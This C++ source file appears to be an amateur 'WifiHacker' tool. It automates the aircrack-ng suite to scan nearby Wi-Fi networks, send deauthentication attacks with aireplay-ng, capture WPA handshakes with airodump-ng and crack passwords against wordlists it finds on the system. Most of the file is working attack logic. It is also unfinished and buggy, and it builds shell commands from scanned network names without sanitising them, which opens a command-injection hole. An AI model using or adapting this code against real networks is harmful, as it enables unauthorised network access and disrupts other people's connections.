#include "hackwifi.h"

#ifndef HACKWIFI_CPP
#define HACKWIFI_CPP


namespace air {

/**
 * @brief init checks if program has everything needed to run correctly
 * @return -1 if it fails to initialize, 0 if everything is good
 */
int init(std::stringstream&cout)
{
    //////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////START_UP/////////////////////////////////////////////////
    cout << "WifiHacker.exe initializing...\n";
    cout << "Version: 0.0.1\nAuthor: Felix Ferreira\n";
    cout << "Current time: ";
    system("date > date.txt");
    std::ifstream getDate("date.txt");

    if(getDate.is_open())
    {
        std::string temp;
        std::getline(getDate, temp);
        cout << temp << std::endl;
    }
    else
    {
        cout << "Could not get date...\n";
    }
    system("rm date.txt");


    if(!checkTools())//if checkTools fails
    {
        cout << "\n\nMissing tool!\nCould not find/install aircrack-ng... Maybe sources is missing/broken?\nExiting...\n";
        return -1;
    }

    cout << "Initialized...\n";
    return 0;
}

/**
 * @brief checkTools checks that aircrack-ng tool suite is intalled, and if not prompts user to install
 * @return true if aircrack-ng installed correctly, false if cannot
 */
bool checkTools()
{
    bool aircrack = false,  airodump = false, aireplay = false;
    checkVersions(aircrack, airodump, aireplay);

    //if a version is not found
    if(!aircrack || !airodump || !aireplay)
    {
        //attempt install
        std::stringstream cout;
        fixInstalls(aircrack, airodump, aireplay, cout);
        checkVersions(aircrack, airodump, aireplay);//update version
    }

    //check again after fixInstall
    if(!aircrack || !airodump || !aireplay)
    {
        return false;
    }

    return true;
}

/**
 * @brief checkVersions checks version of needed software
 * @param aircrack set to true if version exists
 * @param airodump set to true if version exists
 * @param aireplay set to true if version exists
 */
void checkVersions(bool& aircrack, bool& airodump, bool& aireplay)
{
    //text file to write versions to
    std::string versionText = "aircrackVersion.txt";

    //aircrack-ng doesnt have --version or -version
    system(std::string("aircrack-ng | grep -i \'(C)\' > " + versionText).c_str()); //aircrack-ng --help doesnt contain version number for whatever reason but just command does
    system(std::string("airodump-ng --help | grep -i \'(C)\' >> " + versionText).c_str());
    system(std::string("aireplay-ng --help | grep -i \'(C)\' >> " + versionText).c_str());

    //booleans to  store if software is installed
    aircrack = airodump = aireplay = false;

    //check for installs
    std::string line;
    std::ifstream file(versionText.c_str());
    while(std::getline(file, line))
    {
        if(line.find("Aircrack-ng") != std::string::npos)
        {
            aircrack = true;
        }
        else if(line.find("Airodump-ng") != std::string::npos)
        {
            airodump = true;
        }
        else if(line.find("Aireplay-ng") != std::string::npos)
        {
            aireplay = true;
        }
    }

    file.close();
    system(std::string("rm " + versionText).c_str());
}

/**
 * @brief fixInstalls prompts user to install missing software
 * @param aircrack set to true if version was found
 * @param airodump set to true if airodump was found
 * @param aireplay set to true if aireplay was found
 */
void fixInstalls(bool& aircrack, bool& airodump, bool& aireplay, std::stringstream&cout)
{
    char choice = 'n';

    if(!aircrack || !airodump || !aireplay)//aircrack not found
    {
        cout << "aircrack-ng missing!\n Install(Y/n): ";
        //std::cin >> choice;

        if (choice != 'y' || choice != 'Y')
        {
            cout << "Cannot continue without additional software!\nExiting...\n";
            exit(-1);
        }
        else
        {
            system("apt-get install aircrack-ng");
        }
    }
}


/**
converts a list of string aps and returns a list of ap structs

@param list list of strings of aps to be converted
@return list of ap struct items
*/
std::vector<ap> toApVector(std::vector<std::string>& list)
{
    //temporary ap vector to push data onto
    std::vector<ap> temp;
    std::string line;
    std::size_t pos;
    ap a;


    //for all lines in the list
    for(int i = 0; i < (int)list.size(); i++)
    {
        line = list[i];//take the string and put it in line

        //if it is an address
        if(line.find("Address: ") != std::string::npos)
        {
            pos = line.find("Address: ");

            for(int j = pos + 9; j < (int)line.size(); j++)
            {
                a.address.push_back(line[j]);
            }
        }//channel
        else if(line.find("Channel:") != std::string::npos)//NEED THE : in this case, otherwise adds channel twice
        {
            pos = line.find("Channel:");

            for(int j = pos + 8; j < (int)line.size(); j++)
            {
                a.channel.push_back(line[j]);
            }
        }//essid
        else if(line.find("ESSID:") != std::string::npos)
        {
            pos = line.find("ESSID:");

            for(int j = pos + 6; j < int(line.size()); j++)
            {
                a.essid.push_back(line[j]);
            }

            //if "/x00" is found in the name
            if(a.essid.size() != 0 && a.essid.find("\\x00") != std::string::npos)
            {
                //cout << a.address << a.channel << a.essid;
                a.address.clear();
                a.channel.clear();
                a.essid.clear();
            }
        }

        //if we find Cell 01 again it means we are repeating
        if(i > 0 && line.size() > 0 && line.find("Cell 01") != std::string::npos)
        {
            break;
        }

        //every 4 lines we have a new ap
        if(a.address != "" && a.channel != "" && a.essid != "")
        {
            //check for duplicate b4 adding in
            if(!duplicate(a, temp))
            {
                temp.push_back(a);//save to vector and reset a
            }

            a.address.clear();
            a.channel.clear();
            a.essid.clear();
        }
    }
    return temp;
}

/**
 * @brief duplicate checks if an ap is already is in the ap vector given
 * @param a ap struct to be checked for duplicate
 * @return true if duplicate exists, false if it doesn't
 */
bool duplicate(ap &a, std::vector<ap> &apVector)
{
    for(ap temp : apVector)
    {
        if(temp.essid.compare(a.essid) == 0)
        {
            return true;
        }
    }

    return false;
}

/**
 *gets a number from user that can be used to safely index a passed in std::vector
 *
 * @param myVector vector to be used as the safety check
 * @return a safe number from the user to be used on the input vector
 */
template <class T>
int getNumber(std::vector<T> myVector)
{
    std::string input = "";
    int number = 0;

    //loop until we get a valid number
    while(true)
    {
        trashTheBuffer();

        std::stringstream inputStream(input);
        if(inputStream >> number)
        {
            //safe number for vector
            if(number > (int)myVector.size() && (number = (int)myVector.size())){}//just playing a little bit
            if(number < 0 && (number = 0)){}//lets fool around some more
            return number;
        }
        //std::cout << "Number please\n";
    }

    return 0;
}

/**
 * @brief scanWifi scans the nearby APs
 * @param apList name of text file to write a list of APs
 * @param interface interface to scan on
 * @return
 */
std::string scanWifi(std::string apList, std::string interface)
{
    std::string iwList = "apListFull.txt";
    std::string error;

    std::string wifiScanStream = "sudo iwlist " + interface + " scan > " + iwList;//remember to add mon at end of interface name
    std::string grepStream = "sudo grep -i \'essid\\|channel\\|address\' " + iwList + " > " + apList;
    system(wifiScanStream.c_str());
    system(grepStream.c_str());

    //make sure files exist and have something
    std::ifstream fileCheck(apList.c_str());
    if(fileCheck.is_open())
    {
        std::string line;
        std::getline(fileCheck, line);
        if(line.size() == 0)
        {
            error.append("\nCould not find any APs\n");
        }
    }
    else
    {
        error.append("\nFile could not be made to process!\nError at scanWifi()...\n");
    }
    std::string removeFile = "rm " + iwList;
    system(removeFile.c_str());

    return error;
}

/**
  retrives a list of interfaces to choose from, usually denoted wlan0 or wlan1

 * @brief getInterface
 * @return the interface choosen by user
 */
std::vector<std::string> getInterface()
{
    //make a file to store system output
    std::string systemOutputFile = "interfaces.txt";
    std::string removeFile = "rm " + systemOutputFile;
    std::string systemOutputFileCall = "ifconfig | grep -i wlan > " + systemOutputFile;

    system(systemOutputFileCall.c_str());//makes a text file with list of wireless devices

    //open systemOutputFile to read from
    std::ifstream interfaces(systemOutputFile.c_str());

    //if the file is open
    if(interfaces.is_open())
    {
        std::vector<std::string> interfaceVector;
        std::string temp;
        while(std::getline(interfaces, temp))//while we can still read in interfaces
        {
            //clean up our read in interface
            temp = temp.substr(0, temp.find(":"));//cut everything after the first space

            interfaceVector.push_back(temp);
        }

        interfaces.close();
        system(removeFile.c_str());//clean up the file
        return interfaceVector;//finish!
    }

    return std::vector<std::string>();//return nothing
}

/**
 * @brief getConnectedUsers retrives a list of connected users to an Access point using some interface
 * @return a vector filled with connected users to an AP as strings
 */
std::vector<std::string> getConnectedUsers(ap host, std::string interface)
{
    //start up device
    system(std::string("airmon-ng start " + interface).c_str());
    std::string interfaceMon = interface + "mon";

    //data and commands
    //char fileName[] = "connectedUsers.txt";
    char tempFileName[] = "temp.txt";

    //command runs airodump for 5 seconds before timing out, at the end of the 5 seconds file is generated containing all generated output
    std::string command = std::string(std::string("timeout 10 airodump-ng -c ")
                                 + host.channel
                                 + " --bssid "
                                 + host.address + " -u 1 -w " +
                                      tempFileName).c_str();
                                 //+ " " + interfaceMon + " 2> " + tempFileName ).c_str(); //airodump uses 2> stream


    //run command
    system(command.c_str());


    //parse temp text file, or the csv
    std::vector<std::string> targets = parseTargetsFile(tempFileName);


    //remove temp text file
    std::string removeFileCommand = std::string("rm ") + tempFileName + "*";//deletes temporary capture information
    system(removeFileCommand.c_str());


    //stop interface
    system(std::string("airmon-ng stop " + interfaceMon).c_str());

    //parse string

    return std::vector<std::string>();//////////////////////////////////////TEMPORARY
}

std::vector<std::string> parseTargetsFile(std::string file)
{
    std::ifstream fStream(file+".csv");

    //crash the program if file is not open
    if(!fStream.is_open())
    {
        std::exit(-1);
    }

    std::string line;

    //passes thrpugh garbage data
    while(fStream.is_open() && line.find("Station") != std::string::npos)
    {
         fStream >> line;
    }



    fStream.close();
}

/**
 * @brief attack attacks the given ap using the given interface
 * @param target target of aireplay deauth attack
 * @param interface interface to use aireplay and airmon on
 * @param fileName name to capture the files on
 * @return
 */
bool attack(ap target, std::string interface, std::string fileName, int secondsTimeOut)
{
    std::string handshakeFile = "handshake.txt";
    std::string removeFile = "rm " + handshakeFile;
    std::string removeAirodumpFiles = "rm " + fileName + "*";
    bool handshakeCapture = false;

    system(removeAirodumpFiles.c_str());
    system(removeFile.c_str());

    runAirodump( target, interface, fileName, handshakeFile, secondsTimeOut);
    runAireplay(target, interface);


    handshakeCapture = checkHandshakeFile(handshakeFile);

    if(!handshakeCapture)
    {
        system(removeAirodumpFiles.c_str());
        system(removeFile.c_str());
    }

    system(std::string("mv " + handshakeFile + " " + fileName).c_str());//unnecesary
    system(std::string("rm " + fileName).c_str());//clean up
    system(removeFile.c_str());
    return handshakeCapture;
}

/**
 * @brief runAirodump starts airmon-ng command using paramaters given for an unspecified time
 * @param target target to monitor
 * @param interface interface to monitor on
 * @param fileName filename that airodump
 * @param handshakeStream file to write out output from airmon-ng, can be used to check for handshake capture
 * @param secondsTimeOut seconds before timing out
 */
void runAirodump(ap target, std::string interface, std::string fileName, std::string handshakeStreamFile, int secondsTimeOut)
{
    std::string command = "(sleep 2 && aireplay-ng -0 3 -a " + target.address + " " + interface
            + " &) ; timeout " + std::to_string(secondsTimeOut) + " airodump-ng -c " + target.channel + " --bssid " + target.address + " --update 1 -w " + fileName + " " + interface + " 2> " + handshakeStreamFile + " &";

    system(command.c_str());
    system( std::string("sleep " + std::to_string(secondsTimeOut)).c_str());
    system(std::string("grep -ic handshake " + handshakeStreamFile + " >> tempHandshake.txt ; rm " + handshakeStreamFile + " ; mv tempHandshake.txt " + handshakeStreamFile).c_str());
    return;
}

/**
 * @brief runAireplay runs aireplay-ng deauth attack on target ap once
 * @param target target for deauth attack
 * @param interface interface to run deauth attack on
 */
void runAireplay(ap target, std::string interface)
{
    std::string command = "aireplay-ng -0 3 -a " + target.address + " " + interface + " &";
    system(command.c_str());
}

/**
 * @brief checkHandshakeFile check if airodump captured a handshake
 * @param handshakeFile filename of file to be checked
 * @param target the target whose handshake we are checking if we captured
 * @return true if handshake was captured, false otherwise
 */
bool checkHandshakeFile(std::string handshakeFile)
{
    std::ifstream infile(handshakeFile);
    std::string line;

    //read the whole file
    if(std::getline(infile, line))
    {
        if(std::stoi(line.c_str()) > 0)
        {
            infile.close();
            return true;
        }
    }

    infile.close();

    return false;
}

/**
 * @brief crackPassword attempts to crack passwords from agenerated .cap file
 * @param target target ap
 */
void crackPassword(ap target)
{
    std::string myWords("myWords.txt");

    //std::cout << "Attempting crack...\nSearching for wordlist...\n";
    system("find / -iname \'*.lst\' > myWords.txt");
    system("find -iname \'*.txt\' >> myWords.txt");

    //std::cout << "Printing what was found on-system:\n";
    std::ifstream files(myWords.c_str());
    std::string line;
    std::vector<std::string> myWordlistVector;

    int index = 0;
    while(std::getline(files, line))
    {
        myWordlistVector.push_back(line);
    }
    system("rm myWords.txt");

    bool cracked = false;
    while(!cracked)
    {
        index = getNumber(myWordlistVector);

        //std::cout << myWordlistVector[index] << " choosen!\nAttempting crack...\n";
        system("rm password.txt");
        system(std::string("aircrack-ng -w " + myWordlistVector[index] + " -b " + target.address + " -l password.txt *.cap").c_str());

        std::ifstream passwordFile("password.txt");
        if(std::getline(passwordFile, line) && line.size() > 0)
        {
            //std::cout << "Password found: " << line << std::endl;
            passwordFile.close();

            //std::cout << "Press <ENTER> to continue...";
            trashTheBuffer();
            getchar();//pause ungracefully for now!!!////////////////////////////////////////////////////////////
            return;
        }

        //std::cout << "Password not found!\n";
        pressEnterToContinue();
        passwordFile.close();
    }

    return;
}

/**
 * @brief createApHandshakeFile stores the data of ap whose handshake we captured
 * @param file filename to write to
 * @param aps aps to store as text
 */
void createApHandshakeFile(std::string file, std::vector<ap> aps)
{
    std::ofstream outputFile(file.c_str());

    if(!outputFile.is_open())
    {
        return;
    }

    outputFile << "APs whose handshake we have captured:\n";

    for(ap a : aps)
    {
        //so we can reuse toApVector()
        outputFile << "ESSID:" << a.essid << std::endl <<
                      "Address: " << a.address << std::endl <<
                      "Channel:" << a.channel << std::endl;
    }

    outputFile.close();
}



/**
 * @brief genericAttack prompts to carry out basic deauth attack
 */
void genericAttack(std::string apHandshakeFile)
{
    //start scanning
    std::string apList = "apList.txt";
    std::string cout = scanWifi(apList, "wlan0");

    //end scan
    //read out targets
    std::ifstream aps;
    aps.open(apList.c_str());

    std::string line;
    std::vector<std::string> listOfAps;
    std::vector<ap> apVector;

    if(aps.is_open())
    {
        //read in aps
        while(std::getline(aps, line))
        {
            listOfAps.push_back(line);
        }
        aps.close();//close file since we dont need it anymore

        apVector = toApVector(listOfAps);
    }
    else
    {
        //std::cout << "Error opening ap list.\nExiting!\n";
        exit(-2);
    }
    system(std::string("rm " + apList).c_str());

    ////////////////////////////////////////////////////////////////////////////////////////////
    system(std::string("rm " + apHandshakeFile).c_str());
    ////////////////////////////////////////////////////////////////////////////////////////////

    //select AP to attack
    //std::cout << "\n\nSelect AP to attack: ";
    int targetAp = getNumber(apVector);

    //select interface to attack on
    std::string interface = getInterface()[0];


    char start = 'y';

    if(start == 'y' || start == 'Y')//start
    {
        std::string captureFile = "hacker";
        int timeOut = 10;//10 second timeout
        if(!attack(apVector[targetAp], interface, captureFile, timeOut))
        {
          //  std::cout << "Handshake capture failed!\n retrying...\n";////////////
        }

        //std::cout << "handshake captured!\n";

        ////////////////////MAKE BETTER LATER///////////////////////////////////////////////////////////////////
        std::vector<ap> temp;
        temp.push_back(apVector[targetAp]);
        createApHandshakeFile(apHandshakeFile, temp);
        ////////////////////////////////////////////////////////////////////////////////////////////////////////

        crackPassword(apVector[targetAp]);
    }
    else//exit
    {
        return;
    }
}

/**
 * @brief crackAttack
 * @param apHandshakeFile text file that contains the list of aps whose handshake we have
 */
void crackAttack(std::string apHandshakeFile)
{
    //generate vector of ap's whose handshake we have captured
    //std::cout << "Reading in AP whose handshake we've captured...\n";

    std::ifstream inFile(apHandshakeFile.c_str());
    if(!inFile.is_open())
    {
        //std::cout << "Could not read in from " << apHandshakeFile.c_str() << std::endl;
        pressEnterToContinue();
        return;
    }

    std::string line;
    std::vector<std::string> apVectorList;
    while(std::getline(inFile, line))
    {
        apVectorList.push_back(line);
    }

    std::vector<ap> aps = toApVector(apVectorList);
    inFile.close();
    //std::cout << "Finished reading in captured APs...\n";

    if(aps.size() == 0)
    {
        //std::cout << "No aps with matching handshakes were found...\nhave you scanned yet?\n";
        pressEnterToContinue();
        return;
    }

    int target = getNumber(aps);

    //start cracking, generate text file that if password gets cracked it adds the AP and password to some text file list
    crackPassword(aps[target]);

}

void trashTheBuffer(){}
void pressEnterToContinue(){/*std::cout << "Press <ENTER> to continue...\n";std::string s; std::getline(std::cin, s);trashTheBuffer();getchar();*/}

std::string apToString(ap a)
{
    std::string temp;
    temp.append("ESSID: " + a.essid + "\n");
    temp.append("Address: " + a.address + "\n");
    temp.append("Channel: " + a.channel + "\n");
    return temp;
}
std::string handshakeToString(Handshake h)
{
    std::string temp;
    temp.append("\ndirectory:" + h.directory + "\n");
    temp.append("ESSID:" + h.essid + "\n");
    temp.append("Address:" + h.address + "\n");
    temp.append("Channel:" + std::to_string(h.channel) + "\n");
    temp.append("start_comment:" + h.directory + "\n");
    temp.append(h.comment);
    temp.append("\nend_comment:" + h.directory + "\n");

    return temp;
}


}

#endif
